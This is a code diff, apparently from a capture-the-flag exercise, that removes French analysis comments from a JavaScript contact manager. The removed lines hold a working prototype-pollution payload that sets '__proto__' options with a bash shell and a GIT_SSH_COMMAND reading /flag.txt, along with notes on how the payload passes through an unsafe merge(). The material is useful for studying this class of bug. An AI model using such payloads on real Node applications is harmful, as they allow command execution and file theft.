@@ -154,10 +154,9 @@ State.AddNewContact.Process = function (data) {
 		},
 		"data" : info
 	};
-	// SH : seulement la section data va etre exploitable ...
 
-	info.name = info.name || rand(); // si info.name = __proto__
-	Contacts[info.name] = contact; // Contacts.__proto__ = Object = contact avec options hardcodé mais data = payload
+	info.name = info.name || rand(); 
+	Contacts[info.name] = contact; 
 	NewContact = true;
 	goto(State.MainMenu);
 	
@@ -207,9 +206,7 @@ State.SpellcheckContact.Process = function (data) {
 		return;
 	}
 
-	var selection = data.replace(/[\n\r]+$/g, ""); // SH : en gros le nom qu'on a entré
-	// payload:
-	// {"name":"__proto__","options":{"__proto__":{"shell":"bash","env":{"GIT_SSH_COMMAND":"cat /flag.txt > /dev/stdout"}}},"description":"test"}
+	var selection = data.replace(/[\n\r]+$/g, ""); 
 	var info = Contacts[selection];
 	if (!info) {
 		write("Contact doesn't exists ! \n");
@@ -219,20 +216,6 @@ State.SpellcheckContact.Process = function (data) {
 
 	var defaultOptions = { "lang" : "en", "spellcheck" : "simple" };
 	var options = merge(defaultOptions, info.options); 
-	for (var attr in options) {
-		console.log(attr)
-	}
-	/*
-	si __proto__ était en input pour le nom du contact a spelled alors info.options = 
-				{"type" : "JSON",
-				"date" : creationTime,
-				"lang" : "en",
-				"spellcheck" : "simple"}
-	Si j'avais mis data ca prendrait la section dans options dans mon payload soit:
-	{"__proto__":{"shell":"bash","env":{"GIT_SSH_COMMAND":"cat /flag.txt > /dev/stdout"}}}
-	c'est mieux deja car mon var options sera égal à :
-	{"lang" : "en", "spellcheck" : "simple", "__proto__":{"shell":"bash","env":{"GIT_SSH_COMMAND":"cat /flag.txt > /dev/stdout"}}}
-	*/
 	spellcheck(info.data, options);
 
 	write("Spellcheck finished ! \n");
